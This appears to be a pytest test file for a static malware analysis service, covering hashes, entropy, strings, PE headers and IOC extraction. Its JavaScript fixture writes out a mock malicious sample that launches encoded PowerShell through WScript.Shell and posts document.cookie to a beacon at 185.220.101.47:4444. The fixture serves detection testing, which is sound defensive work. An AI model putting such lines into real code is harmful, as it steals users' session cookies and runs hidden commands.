"""
Tests for analysis_service/static_analyzer.py

Run with: pytest tests/test_static_analyzer.py -v
"""

import json
import os
import tempfile
import pytest

from analysis_service.static_analyzer import (
    compute_hashes,
    compute_entropy,
    extract_strings,
    parse_pe_headers,
    run_yara,
    detect_file_type,
    extract_iocs,
    analyze,
)


# ── Fixtures ───────────────────────────────────────────────────────────────────

@pytest.fixture
def js_sample(tmp_path):
    """Minimal JavaScript file that resembles the malware sample format."""
    content = b"""
var _0x1a2b = ['eval','atob','WScript.Shell'];
var shell = new ActiveXObject('WScript.Shell');
shell.Run('cmd.exe /c powershell.exe -enc AAAA');
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://185.220.101.47:4444/beacon', true);
xhr.send(btoa(document.cookie));
var domain = 'update-service.club';
"""
    p = tmp_path / "sample.js"
    p.write_bytes(content)
    return str(p)


@pytest.fixture
def binary_sample(tmp_path):
    """High-entropy binary blob simulating a packed payload."""
    import random
    rng = random.Random(42)
    data = bytes(rng.randint(0, 255) for _ in range(4096))
    p = tmp_path / "packed.bin"
    p.write_bytes(data)
    return str(p)


@pytest.fixture
def empty_file(tmp_path):
    p = tmp_path / "empty.bin"
    p.write_bytes(b"")
    return str(p)


# ── compute_hashes ─────────────────────────────────────────────────────────────

def test_compute_hashes_returns_all_three(js_sample):
    result = compute_hashes(js_sample)
    assert set(result.keys()) == {"md5", "sha1", "sha256"}
    assert len(result["md5"]) == 32
    assert len(result["sha1"]) == 40
    assert len(result["sha256"]) == 64


def test_compute_hashes_deterministic(js_sample):
    r1 = compute_hashes(js_sample)
    r2 = compute_hashes(js_sample)
    assert r1 == r2


def test_compute_hashes_different_files(js_sample, binary_sample):
    r1 = compute_hashes(js_sample)
    r2 = compute_hashes(binary_sample)
    assert r1["sha256"] != r2["sha256"]


# ── compute_entropy ────────────────────────────────────────────────────────────

def test_entropy_js_file_moderate(js_sample):
    entropy = compute_entropy(js_sample)
    assert 3.0 < entropy < 6.5, f"JS entropy {entropy} outside expected range"


def test_entropy_binary_high(binary_sample):
    entropy = compute_entropy(binary_sample)
    assert entropy > 7.0, f"Random binary entropy {entropy} should be near 8.0"


def test_entropy_empty_file(empty_file):
    entropy = compute_entropy(empty_file)
    assert entropy == 0.0


def test_entropy_returns_float(js_sample):
    assert isinstance(compute_entropy(js_sample), float)


# ── extract_strings ────────────────────────────────────────────────────────────

def test_extract_strings_finds_known_strings(js_sample):
    strings = extract_strings(js_sample, min_len=6)
    combined = " ".join(strings)
    assert "ActiveXObject" in combined or "WScript" in combined


def test_extract_strings_min_len_respected(js_sample):
    strings = extract_strings(js_sample, min_len=10)
    for s in strings:
        assert len(s) >= 10


def test_extract_strings_capped_at_500(binary_sample):
    # Force large number of strings by using a text-heavy file
    with tempfile.NamedTemporaryFile(suffix=".txt", delete=False, mode="wb") as f:
        # Write 600 distinct 7-char strings
        for i in range(600):
            f.write(f"string{i:04d}\n".encode())
        path = f.name
    try:
        strings = extract_strings(path, min_len=6)
        assert len(strings) <= 500
    finally:
        os.unlink(path)


def test_extract_strings_returns_list(js_sample):
    result = extract_strings(js_sample)
    assert isinstance(result, list)


# ── parse_pe_headers ───────────────────────────────────────────────────────────

def test_parse_pe_headers_returns_none_for_js(js_sample):
    result = parse_pe_headers(js_sample)
    assert result is None


def test_parse_pe_headers_returns_none_for_empty(empty_file):
    result = parse_pe_headers(empty_file)
    assert result is None


# ── detect_file_type ───────────────────────────────────────────────────────────

def test_detect_file_type_js(js_sample):
    result = detect_file_type(js_sample)
    assert isinstance(result, str)
    assert len(result) > 0


def test_detect_file_type_extension_fallback(tmp_path):
    p = tmp_path / "script.vbs"
    p.write_bytes(b"WScript.Echo 'hello'")
    result = detect_file_type(str(p))
    assert "VBScript" in result or isinstance(result, str)


# ── extract_iocs ───────────────────────────────────────────────────────────────

def test_extract_iocs_finds_ip(js_sample):
    strings = extract_strings(js_sample)
    iocs = extract_iocs(strings)
    assert "ips" in iocs and "domains" in iocs and "urls" in iocs
    # The JS sample contains 185.220.101.47
    assert "185.220.101.47" in iocs["ips"]


def test_extract_iocs_finds_domain(js_sample):
    strings = extract_strings(js_sample)
    iocs = extract_iocs(strings)
    assert any("update-service.club" in d for d in iocs["domains"])


def test_extract_iocs_finds_url(js_sample):
    strings = extract_strings(js_sample)
    iocs = extract_iocs(strings)
    assert any("185.220.101.47" in u for u in iocs["urls"])


def test_extract_iocs_empty_input():
    iocs = extract_iocs([])
    assert iocs == {"ips": [], "domains": [], "urls": []}


def test_extract_iocs_caps_at_50():
    many_ips = [f"10.0.{i}.{j}" for i in range(10) for j in range(10)]
    iocs = extract_iocs(many_ips)
    assert len(iocs["ips"]) <= 50


# ── analyze (full pipeline) ────────────────────────────────────────────────────

def test_analyze_schema_complete(js_sample):
    result = analyze(js_sample)
    required_keys = {"file_path", "file_size", "file_type", "hashes", "entropy", "strings", "pe_info", "yara_matches", "iocs"}
    assert required_keys.issubset(set(result.keys()))


def test_analyze_hashes_present(js_sample):
    result = analyze(js_sample)
    assert "md5" in result["hashes"]
    assert "sha256" in result["hashes"]


def test_analyze_js_has_no_pe_info(js_sample):
    result = analyze(js_sample)
    assert result["pe_info"] is None


def test_analyze_file_size_correct(js_sample):
    result = analyze(js_sample)
    assert result["file_size"] == os.path.getsize(js_sample)


def test_analyze_iocs_dict_structure(js_sample):
    result = analyze(js_sample)
    assert isinstance(result["iocs"], dict)
    assert "ips" in result["iocs"]
    assert "domains" in result["iocs"]


def test_analyze_strings_capped(js_sample):
    result = analyze(js_sample)
    assert len(result["strings"]) <= 200


def test_analyze_yara_returns_list(js_sample):
    result = analyze(js_sample)
    assert isinstance(result["yara_matches"], list)
